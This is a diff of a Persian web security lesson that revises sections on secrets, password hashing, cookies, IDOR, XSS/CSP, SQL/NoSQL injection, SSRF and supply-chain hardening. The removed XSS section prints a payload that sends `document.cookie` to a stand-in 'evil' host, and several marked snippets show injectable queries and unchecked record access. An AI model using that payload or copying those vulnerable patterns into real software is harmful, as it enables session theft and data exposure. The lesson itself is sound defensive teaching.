@@ -1,244 +1,285 @@
-# امنیت برنامه‌های وب
+# امنیت وب و اپلیکیشن
 
-> مراجع: [OWASP Top 10](https://owasp.org/www-project-top-ten/) · [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/) · [Express Security](https://expressjs.com/en/advanced/best-practice-security.html)
+> مراجع: [OWASP Top 10](https://owasp.org/www-project-top-ten/) · [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/) · [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
 
-امنیت یک قابلیت نیست؛ یک عادت در هر خط کد است. این درس پرتکرارترین اشتباهاتی را که واقعاً منجر به نشت داده می‌شوند پوشش می‌دهد.
+## در این درس چه یاد می‌گیرید؟
 
-## ۱. OWASP Top 10 — نقشه‌ی راه
+تهدیدهای واقعی یک اپ کامل (فرانت، API، دیتابیس، دسکتاپ) را می‌شناسید و برای هر کدام کنترل عملی پیاده می‌کنید: مدیریت راز، هش رمز، کوکی امن، جلوگیری از IDOR/XSS/SSRF/SQLi و امنیت زنجیره‌ی تأمین. در پایان، یک چک‌لیست امنیتی قابل‌اجرا برای پروژه‌ی خود دارید.
 
-| # | دسته | نمونه در عمل |
-| --- | --- | --- |
-| A01 | Broken Access Control | کاربر A با تغییر `id` در URL داده‌ی کاربر B را می‌بیند |
-| A02 | Cryptographic Failures | ذخیره‌ی رمز با MD5 یا ارسال روی HTTP |
-| A03 | Injection | `"SELECT * FROM users WHERE name='" + input + "'"` |
-| A04 | Insecure Design | نبود rate limit روی ورود، نبود تأیید مالکیت |
-| A05 | Security Misconfiguration | `NODE_ENV=production` نبودن، CORS باز، stack trace عمومی |
-| A06 | Vulnerable Components | پکیج قدیمی با CVE شناخته‌شده |
-| A07 | Auth Failures | JWT بدون انقضا، نبود قفل پس از تلاش‌های ناموفق |
-| A08 | Integrity Failures | نصب پکیج ناشناس، deserialize داده‌ی غیرقابل اعتماد |
-| A09 | Logging Failures | لاگ نکردن رویدادهای امنیتی |
-| A10 | SSRF | fetch کردن URLی که کاربر می‌دهد بدون allowlist |
+---
 
-## ۲. هش رمز عبور
+## ۱. مدل تهدید در ۵ سؤال
+
+1. چه چیزی ارزش محافظت دارد؟ (رمز، توکن، داده‌ی کاربر، پرداخت)
+2. چه کسی مهاجم است؟ (کاربر عادی، کاربر احراز هویت‌شده، ربات)
+3. از کجا وارد می‌شود؟ (فرم، URL، هدر، فایل، وابستگی)
+4. چه اتفاقی می‌افتد اگر بشکند؟
+5. چه کنترلی داریم و چطور تست می‌شود؟
+
+بدون این پنج پاسخ، «امنیت» فقط چند هدر است.
+
+## ۲. مدیریت راز
+
+```bash
+# .gitignore
+.env
+.env.*
+!.env.example
+*.pem
+```
+
+```bash
+npx gitleaks detect --no-git -v     # اسکن قبل از commit
+git filter-repo --path .env --invert-paths   # حذف از تاریخچه (در صورت لو رفتن)
+```
+
+- راز فقط در env/secret manager؛ هرگز در کد، README، تست یا باندل فرانت.
+- `.env.example` بدون مقدار واقعی.
+- **اگر رازی لو رفت، آن را بچرخانید**؛ حذف فایل کافی نیست (در تاریخچه/کش/فورک می‌ماند).
+- در فرانت فقط `VITE_`/`NEXT_PUBLIC_` عمومی؛ کلید سرویس پولی سمت سرور.
+
+## ۳. رمز عبور
 
 ```ts
 import argon2 from 'argon2'
 
-export const hashPassword = (plain: string) => argon2.hash(plain, { type: argon2.argon2id })
-export const verifyPassword = (hash: string, plain: string) => argon2.verify(hash, plain)
+const hash = await argon2.hash(password, { type: argon2.argon2id, memoryCost: 19456, timeCost: 2 })
+const ok = await argon2.verify(hash, candidate)
 ```
 
-قواعد:
+| الگوریتم | وضعیت |
+| --- | --- |
+| MD5/SHA-1/SHA-256 خام | ❌ هرگز |
+| bcrypt (cost ≥ 12) | ✅ قابل قبول |
+| scrypt | ✅ |
+| Argon2id | ✅ توصیه‌شده |
 
-- **هرگز** رمز را با SHA-256/MD5 هش نکنید؛ برای رمز باید الگوریتم کند و نمک‌دار (argon2id/bcrypt/scrypt) استفاده شود.
-- طول رمز از ۸ کاراکتر و بدون محدودیت حداکثر مضحک (حداقل ۶۴ کاراکتر مجاز).
+- طول حداقل ۸–۱۲، بدون محدودیت عجیب؛ حداکثر ~۷۲ بایت برای bcrypt.
+- پیام خطای ورود یکسان: «ایمیل یا رمز نادرست است» (جلوگیری از enumeration).
+- rate limit روی login و فراموشی رمز.
 - رمز را هرگز لاگ نکنید.
-- برای بازیابی رمز، توکن یک‌بارمصرف با انقضای کوتاه بفرستید — نه رمز فعلی.
 
-## ۳. XSS — اجرای اسکریپت در مرورگر کاربر
+## ۴. نشست: کوکی یا JWT؟
 
 ```ts
-// ❌ خطرناک: HTML خام
-res.send(`<p>سلام ${req.query.name}</p>`)
-// با name = <img src=x onerror="fetch('//evil/'+document.cookie)"> کوکی دزدیده می‌شود
-
-// ✅ escape
-import escapeHtml from 'escape-html'
-res.send(`<p>سلام ${escapeHtml(String(req.query.name))}</p>`)
+res.cookie('session', token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'lax',
+  path: '/',
+  maxAge: 1000 * 60 * 60 * 24 * 7
+})
 ```
 
-در React:
+| | کوکی HttpOnly | JWT در localStorage |
+| --- | --- | --- |
+| XSS | امن (JS نمی‌خواند) | ❌ قابل خواندن |
+| CSRF | نیاز به SameSite/CSRF token | مقاوم‌تر |
+| ابطال | آسان | سخت |
+
+توصیه: کوکی `HttpOnly` + `Secure` + `SameSite` برای نشست وب؛ JWT کوتاه‌عمر برای API/موبایل با refresh چرخشی.
+
+CSRF: با `SameSite=Lax/Strict` بیشتر پوشش داده می‌شود؛ برای عملیات حساس توکن CSRF یا بررسی `Origin` هم بگذارید.
+
+## ۵. مجوزدهی: IDOR قاتل خاموش است
+
+```ts
+// ❌ هر کاربری با دانستن id می‌تواند فاکتور دیگران را ببیند
+app.get('/invoices/:id', async (req, res) => {
+  res.json(await db.invoice.findUnique({ where: { id: req.params.id } }))
+})
+
+// ✅ مالکیت/tenant بررسی می‌شود
+app.get('/invoices/:id', requireAuth, async (req, res) => {
+  const invoice = await db.invoice.findFirst({
+    where: { id: req.params.id, userId: req.user.id }
+  })
+  if (!invoice) return res.sendStatus(404)
+  res.json(invoice)
+})
+```
+
+- هر کوئری باید `userId`/`tenantId` داشته باشد.
+- نقش را در سرور بررسی کنید (`requireRole('admin')`).
+- ۴۰۳ برای «می‌دانی وجود دارد ولی اجازه نداری»، ۴۰۴ برای «وجود ندارد/پنهان».
+- تست بنویسید: کاربر A به منبع B دسترسی ندارد.
+
+## ۶. XSS و CSP
+
+React به‌طور پیش‌فرض متن را escape می‌کند؛ خطر در درگاه‌های فرار است:
 
 ```tsx
-<p>{userInput}</p>                     // ✅ به‌صورت متن رندر می‌شود
-<p dangerouslySetInnerHTML={{ __html: userInput }} />   // ❌ فقط با sanitize
+// ❌ خطرناک
+<div dangerouslySetInnerHTML={{ __html: userContent }} />
+
+// ✅ پاک‌سازی
+import DOMPurify from 'dompurify'
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />
 ```
 
-اگر HTML غنی لازم دارید: `DOMPurify` (کلاینت) یا `sanitize-html` (سرور) — بدون استثنا.
-
-**CSP** به‌عنوان لایه‌ی دوم:
-
 ```ts
+// هدر CSP
 app.use((_req, res, next) => {
   res.setHeader(
     'Content-Security-Policy',
-    "default-src 'self'; img-src 'self' data: https:; script-src 'self'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'"
+    "default-src 'self'; img-src 'self' data: https:; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://api.example.com; frame-ancestors 'none'"
   )
   next()
 })
 ```
 
-## ۴. SQL Injection
+- از `innerHTML`، `eval`، `new Function` پرهیز کنید.
+- لینک‌های کاربر با `javascript:` را رد کنید (`new URL` و بررسی protocol).
+- برای اپ Electron: `contextIsolation: true`، `sandbox: true`، `nodeIntegration: false` و باز کردن لینک خارجی با `shell.openExternal` بعد از اعتبارسنجی دامنه.
+
+## ۷. تزریق SQL و NoSQL
 
 ```ts
-// ❌
-await db.query(`SELECT * FROM users WHERE email = '${email}'`)
+// ❌ تزریق
+db.query(`SELECT * FROM users WHERE email = '${email}'`)
 
 // ✅ پارامتر
-await db.query('SELECT * FROM users WHERE email = $1', [email])
+db.query('SELECT * FROM users WHERE email = $1', [email])
 
 // ✅ ORM
-await prisma.user.findUnique({ where: { email } })
+prisma.user.findUnique({ where: { email } })
 ```
 
-ORM به‌تنهایی کافی نیست: `$queryRawUnsafe` و مرتب‌سازی بر اساس نام ستون ورودی کاربر راه‌های دور زدن هستند:
+در MongoDB هم آبجکت ورودی را مستقیم به query ندهید (`{ $ne: null }` می‌تواند همه را برگرداند)؛ ورودی را validate و به نوع انتظاری تبدیل کنید.
+
+## ۸. SSRF: سرور را به آدرس دلخواه نفرستید
 
 ```ts
-const sortable = new Set(['createdAt', 'title', 'price'])
-const orderBy = sortable.has(String(req.query.sort)) ? String(req.query.sort) : 'createdAt'
-```
+import { isIP } from 'node:net'
 
-## ۵. CSRF
+const ALLOWED = new Set(['api.github.com', 'raw.githubusercontent.com'])
 
-حمله: سایت مخرب فرمی به سایت شما ارسال می‌کند و مرورگر کوکی کاربر را می‌فرستد.
-
-اولین خط دفاع: کوکی `sameSite`.
-
-```ts
-res.cookie('session', token, {
-  httpOnly: true,
-  secure: process.env.NODE_ENV === 'production',
-  sameSite: 'lax',          // 'strict' برای عملیات حساس
-  path: '/',
-  maxAge: 1000 * 60 * 60 * 24
-})
-```
-
-برای فرم‌های حساس، توکن CSRF یا بررسی هدر `Origin` هم اضافه کنید. اگر از توکن Bearer در هدر `Authorization` استفاده می‌کنید، CSRF عملاً منتفی است — اما XSS خطرناک‌تر می‌شود.
-
-## ۶. احراز هویت با JWT
-
-```ts
-import jwt from 'jsonwebtoken'
-
-const accessToken = jwt.sign({ sub: user.id, role: user.role }, process.env.JWT_SECRET!, {
-  expiresIn: '15m',
-  issuer: 'acme-api',
-  audience: 'acme-web'
-})
-```
-
-```ts
-// verify middleware
-import type { RequestHandler } from 'express'
-
-export const requireAuth: RequestHandler = (req, res, next) => {
-  const token = req.cookies?.session ?? req.header('authorization')?.replace('Bearer ', '')
-  if (!token) return res.status(401).json({ error: 'احراز هویت لازم است' })
-
-  try {
-    const payload = jwt.verify(token, process.env.JWT_SECRET!, {
-      issuer: 'acme-api',
-      audience: 'acme-web'
-    }) as { sub: string; role: string }
-    req.user = { id: payload.sub, role: payload.role }
-    next()
-  } catch {
-    return res.status(401).json({ error: 'توکن نامعتبر یا منقضی' })
-  }
+export function assertSafeUrl(raw: string): URL {
+  const url = new URL(raw)
+  if (url.protocol !== 'https:') throw new Error('فقط https')
+  if (!ALLOWED.has(url.hostname)) throw new Error('دامنه مجاز نیست')
+  if (isIP(url.hostname)) throw new Error('IP مجاز نیست')
+  return url
 }
 ```
 
-اصول:
+اگر اپ «آدرس تصویر را از کاربر می‌گیرد و دانلود می‌کند» یا «وب‌هوک» دارد، SSRF محتمل است. allowlist دامنه، مسدودسازی IPهای داخلی (127.0.0.1، 169.254.169.254، 10/8، 192.168/16) و محدودیت redirect لازم است.
 
-- Access token کوتاه‌مدت (۱۰–۱۵ دقیقه) + refresh token بلندمدت در کوکی httpOnly.
-- `JWT_SECRET` را از env بگیرید و در production برچسب random حداقل ۳۲ بایت.
-- هیچ‌وقت ادعاهای امنیتی (role) را از سمت کلاینت باور نکنید؛ از توکن امضاشده بخوانید و برای عملیات حساس، مالکیت منبع را هم بررسی کنید.
-
-## ۷. Broken Access Control
+## ۹. Rate limit و سخت‌سازی
 
 ```ts
-// ❌ کاربر می‌تواند id هر کسی را بفرستد
-app.get('/orders/:id', async (req, res) => {
-  res.json(await db.order.findUnique({ where: { id: req.params.id } }))
-})
-
-// ✅ مالکیت بررسی می‌شود
-app.get('/orders/:id', async (req, res) => {
-  const order = await db.order.findUnique({ where: { id: req.params.id } })
-  if (!order) return res.status(404).json({ error: 'یافت نشد' })
-  if (order.userId !== req.user!.id) return res.status(403).json({ error: 'دسترسی ندارید' })
-  res.json(order)
-})
+app.use(rateLimit({ windowMs: 60_000, limit: 100, standardHeaders: true }))
+app.post('/auth/login', rateLimit({ windowMs: 15 * 60_000, limit: 10 }), loginHandler)
+app.use(helmet({ crossOriginResourcePolicy: { policy: 'same-site' } }))
+app.use(express.json({ limit: '100kb' }))
+app.disable('x-powered-by')
 ```
 
-همیشه برای **هر** رکورد مالکیت را بررسی کنید؛ «url مخفی» محافظت نیست.
+- login/OTP/فراموشی رمز سخت‌گیرانه‌تر.
+- قفل موقت بعد از تلاش‌های ناموفق + لاگ.
+- CORS با allowlist دقیق؛ `credentials: true` با `*` ممنوع.
 
-## ۸. Rate limiting و آبشاری از حملات
+## ۱۰. زنجیره‌ی تأمین
 
-```ts
-import rateLimit from 'express-rate-limit'
-
-app.use('/api/auth/login', rateLimit({
-  windowMs: 10 * 60 * 1000,
-  limit: 10,
-  standardHeaders: true,
-  legacyHeaders: false,
-  message: { error: 'تلاش‌های زیاد. لطفاً بعداً امتحان کنید.' }
-}))
+```bash
+npm audit --omit=dev
+npm ci                     # نصب دقیق از lockfile
+npx npm-check-updates
 ```
 
-برای جلوگیری از شمارش کاربران (enumeration) هم پیام یکسان بدهید و هم زمان پاسخ یکسان نگه دارید.
+- lockfile را commit کنید؛ `npm install` در CI بدون lock ریسک است.
+- وابستگی جدید را بررسی کنید: نگه‌داری، دانلودها، اسکریپت‌های نصب.
+- `ignore-scripts=true` در `.npmrc` برای محیط‌های حساس.
+- به‌روزرسانی امنیتی را به تعویق نیندازید.
 
-## ۹. هدرهای امنیتی
+## ۱۱. لاگ و داده‌ی شخصی
 
-```ts
-import helmet from 'helmet'
-app.use(helmet())
+- لاگ ساختاریافته با `requestId`، بدون رمز/توکن/کد ملی/شماره کارت.
+- ماسک کردن ایمیل/تلفن در لاگ.
+- سیاست نگه‌داری و حذف داده.
+- خطاهای ۵۰۰ جزئیات داخلی را به کاربر نشان ندهند.
 
-app.use((_req, res, next) => {
-  res.setHeader('X-Content-Type-Options', 'nosniff')
-  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')
-  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(self)')
-  next()
-})
-```
+## ۱۲. ساخت گام‌به‌گام بازبینی امنیتی پروژه (تمرین)
 
-CORS را محدود کنید:
+**گام ۱ — فهرست دارایی‌ها:** رمز، توکن، داده‌ی کاربر، کلید AI.
 
-```ts
-app.use(cors({
-  origin: (origin, cb) => {
-    const allowed = (process.env.CORS_ORIGIN ?? '').split(',').filter(Boolean)
-    if (!origin || allowed.includes(origin)) return cb(null, true)
-    cb(new Error('Origin غیرمجاز'))
-  },
-  credentials: true
-}))
-```
+**گام ۲ — اسکن راز:** gitleaks روی کل تاریخچه؛ `.env` از git خارج.
 
-## ۱۰. رازها
+**گام ۳ — رمز:** Argon2id + سیاست طول + پیام یکسان + rate limit.
 
-- ‎.env در ‎.gitignore؛ فقط ‎.env.example را commit کنید.
-- در production از secret manager (Vault، AWS Secrets Manager، GitHub Actions secrets) استفاده کنید.
-- اگر راز لو رفت: **باطل کنید**، تاریخچه را پاک کنید، و همه‌ی محیط‌ها را بررسی کنید.
-- کلیدهای API سرویس‌های پولی فقط سمت سرور؛ هرگز در باندل فرانت.
+**گام ۴ — نشست:** کوکی HttpOnly/Secure/SameSite؛ بررسی CSRF برای عملیات حساس.
 
-## ۱۱. لاگ رویدادهای امنیتی
+**گام ۵ — مجوز:** افزودن `userId` به همه‌ی کوئری‌ها؛ تست IDOR با دو کاربر.
 
-```ts
-logger.info({
-  event: 'login_failed',
-  ip: req.ip,
-  userAgent: req.header('user-agent'),
-  emailHash: sha256(email).slice(0, 12)   // هش، نه ایمیل خام
-})
-```
+**گام ۶ — ورودی/خروجی:** Zod برای همه‌ی بدنه‌ها؛ DOMPurify برای HTML؛ CSP.
 
-لاگ نکنید: رمز، توکن کامل، شماره کارت، داده‌ی شخصی حساس.
+**گام ۷ — SSRF:** allowlist برای هر fetch با URL کاربر.
 
-## چک‌لیست قبل از انتشار
+**گام ۸ — هدرها و محدودیت:** helmet، CORS دقیق، limit بدنه، rate limit.
 
-- [ ] رمز با argon2/bcrypt
-- [ ] کوکی/توکن httpOnly+secure یا همان‌سایت
-- [ ] rate limit روی مسیرهای حساس
-- [ ] helmet + CSP + CORS محدود
-- [ ] escape خروجی HTML
-- [ ] بررسی مالکیت منابع
-- [ ] رازها فقط env/secret
-- [ ] وابستگی‌ها به‌روز (`npm audit`)
-- [ ] پیام‌های خطا بدون افشای جزئیات
+**گام ۹ — وابستگی:** `npm audit`، lockfile، حذف پکیج بی‌استفاده.
 
-## تمرین این درس
+**گام ۱۰ — گزارش:** جدول تهدید/کنترل/تست با شواهد.
 
-سرویس احراز هویت امن: ثبت‌نام/ورود/خروج با argon2، JWT کوتاه‌مدت در کوکی httpOnly، rate limit، helmet، CORS محدود، اعتبارسنجی و پیام یکسان برای جلوگیری از enumeration. جزئیات در تب تمرین است.
+### نگاشت به معیارهای پذیرش
+
+| معیار | کجای درس |
+| --- | --- |
+| `hashing` | بخش ۳ (Argon2id) |
+| `cookies` | بخش ۴ (HttpOnly/Secure/SameSite) |
+| `rate-limit` | بخش ۹ |
+| `headers` | بخش ۶ و ۹ (CSP، helmet، CORS) |
+| `secrets` | بخش ۲ |
+| `enumeration` | بخش ۳ (پیام ورود یکسان) |
+
+## ۱۳. عیب‌یابی
+
+| نشانه | علت | راه‌حل |
+| --- | --- | --- |
+| کاربر به داده‌ی دیگری می‌رسد | IDOR | فیلتر مالکیت |
+| کوکی در production نمی‌ماند | Secure روی http | HTTPS |
+| CSRF روی POST | SameSite=None بدون توکن | Lax + CSRF token |
+| XSS با محتوای ادمین | dangerouslySetInnerHTML | DOMPurify/CSP |
+| کلید در باندل | `VITE_`/`NEXT_PUBLIC_` | انتقال به سرور |
+| `npm audit` پر از خطا | وابستگی قدیمی | به‌روزرسانی/جایگزینی |
+| خطای ۵۰۰ جزئیات لو می‌دهد | error handler خام | پیام عمومی + requestId |
+
+## ۱۴. آزمایش‌ها (با پاسخ)
+
+**۱.** چرا SHA-256 برای رمز کافی نیست؟
+
+**پاسخ:** سریع است و با GPU/ASIC میلیاردها حدس در ثانیه زده می‌شود؛ الگوریتم کند و memory-hard لازم است.
+
+**۲.** چرا localStorage برای توکن خطرناک است؟
+
+**پاسخ:** هر XSS می‌تواند آن را بخواند؛ HttpOnly cookie از JS پنهان است.
+
+**۳.** تفاوت ۴۰۳ و ۴۰۴ در مجوز؟
+
+**پاسخ:** ۴۰۳ یعنی احراز هویت شده ولی اجازه ندارد؛ ۴۰۴ برای پنهان کردن وجود منبع.
+
+**۴.** چرا allowlist دامنه در SSRF کافی نیست اگر redirect آزاد باشد؟
+
+**پاسخ:** سرور می‌تواند به آدرس داخلی redirect کند؛ باید redirectها را دنبال/بررسی کنید.
+
+## ۱۵. خودآزمایی
+
+1. پنج سؤال مدل تهدید؟
+2. چرا راز لو رفته باید چرخانده شود؟
+3. کوکی امن چه ویژگی‌هایی دارد؟
+4. IDOR چگونه رخ می‌دهد؟
+5. CSP چه چیزی را محدود می‌کند؟
+6. SSRF در چه قابلیتی محتمل است؟
+
+## ۱۶. چک‌لیست تحویل
+
+- [ ] بدون راز در git و باندل
+- [ ] Argon2id/bcrypt با cost مناسب
+- [ ] کوکی HttpOnly + Secure + SameSite
+- [ ] بررسی مالکیت در همه‌ی کوئری‌ها
+- [ ] تست IDOR با دو کاربر
+- [ ] Zod برای ورودی + پاک‌سازی HTML
+- [ ] CSP و هدرهای امنیتی
+- [ ] rate limit روی auth
+- [ ] allowlist برای fetch با URL کاربر
+- [ ] lockfile + audit پاک
